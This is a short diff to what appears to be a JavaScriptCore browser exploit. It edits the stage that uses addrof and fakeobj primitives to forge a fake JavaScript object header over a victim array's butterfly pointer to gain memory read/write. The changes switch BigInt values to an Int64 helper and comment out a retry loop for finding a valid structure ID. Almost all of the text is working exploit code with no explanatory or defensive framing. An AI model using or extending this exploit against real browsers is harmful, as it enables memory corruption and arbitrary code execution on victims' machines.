@@ -560,9 +560,9 @@ var VM_PROT_EXECUTE = 0x4
     print("[+] victim @"+rw.addr(victim));
 
     // craft a fake object to modify victim
-    var flags_double_array = 0x0108200700001000n;
+    var flags_double_array = new Int64("0x0108200700001000").asJSValue();
     var container = {
-        header: bigint2float(unboxDouble(flags_double_array)),
+        header: new Int64("0x0108200700001000").asJSValue(),
         butterfly: victim
     };
 
@@ -570,8 +570,8 @@ var VM_PROT_EXECUTE = 0x4
     var containerAddr = rw.addr(container);
     print("[+] container @"+ containerAddr);
     // add the offset to let compiler recognize fake structure
-    var hax = rw.fake(containerAddr + 0x10n);
-    var maxtry = 0;
+    var hax = rw.fake(containerAddr + 0x10);
+    /*var maxtry = 0;
     if (hax instanceof Array) {
             print("got fakeobj with real struct id");
             //continue;
@@ -585,7 +585,7 @@ var VM_PROT_EXECUTE = 0x4
               print("wow 10000 tries on getting valid structid failed!!!");
             }
             }
-        }
+        }*/
     // origButterfly is now based on the offset of **victim** 
     // because it becomes the new butterfly pointer
     // and hax[1] === victim.pointer
